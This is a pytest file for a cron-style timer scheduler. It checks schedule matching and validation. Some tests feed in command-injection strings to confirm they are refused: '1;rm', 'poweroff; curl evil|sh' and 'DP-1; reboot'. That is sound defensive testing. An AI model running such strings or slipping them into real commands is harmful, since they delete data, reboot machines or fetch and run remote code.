"""Timers and the cron schedule evaluator."""
from datetime import datetime

import pytest

from utils.models.timers import Timer, TimerManager


def at(text):
    return datetime.strptime(text, '%Y-%m-%d %H:%M')


def T(minute='0', hour='3', dom='*', month='*', dow='*', **kw):
    return Timer(action='reb', minute=minute, hour=hour, day_of_month=dom, month=month, day_of_week=dow, **kw)


def test_daily_schedule_with_wildcards():
    t = T('0', '22')
    assert t.matches(at('2026-10-12 22:00'))
    assert not t.matches(at('2026-10-12 22:01'))


def test_step_range_and_list():
    t = T('*/15', '6-8', dow='1,3')
    assert t.matches(at('2026-10-12 07:45'))        # a Monday
    assert not t.matches(at('2026-10-13 07:00'))    # a Tuesday


@pytest.mark.parametrize('fields', [
    ('60', '*', '*', '*', '*'), ('*', '24', '*', '*', '*'), ('*', '*', '0', '*', '*'), ('*', '*', '*', '13', '*'),
    ('*/0', '*', '*', '*', '*'), ('a', '*', '*', '*', '*'),
    ('', '*', '*', '*', '*'), ('1;rm', '*', '*', '*', '*'), ('1 2', '*', '*', '*', '*'),
])
def test_invalid_schedules_are_refused(fields):
    with pytest.raises(ValueError):
        T(*fields)


def test_timer_refuses_unknown_action_and_free_form_commands():
    with pytest.raises(ValueError):
        Timer(action='poweroff; curl evil|sh', minute='0', hour='1', day_of_month='*', month='*', day_of_week='*')


def test_screen_timer_needs_an_output_name():
    with pytest.raises(ValueError):
        Timer(action='scr_off', minute='0', hour='1', day_of_month='*', month='*', day_of_week='*')
    with pytest.raises(ValueError):
        Timer(action='scr_off', output='DP-1; reboot', minute='0', hour='1', day_of_month='*', month='*',
              day_of_week='*')
    assert Timer(action='scr_off', output='DP-1', minute='0', hour='1', day_of_month='*', month='*',
                 day_of_week='*').serialize()['output'] == 'DP-1'


def test_old_clients_send_numbers():
    t = Timer(action='reb', minute=0, hour=3, day_of_month='*', month='*', day_of_week='*')
    assert (t.minute, t.hour) == ('0', '3')


def test_due_only_lists_enabled_matching_timers():
    m = TimerManager()
    a = Timer(action='reb', minute='0', hour='3', day_of_month='*', month='*', day_of_week='*')
    b = Timer(action='pwr', minute='0', hour='3', day_of_month='*', month='*', day_of_week='*', enabled=False)
    m.timers = {a.uuid: a, b.uuid: b}
    assert m.due(at('2026-10-12 03:00')) == [a]
    assert m.due(at('2026-10-12 03:01')) == []
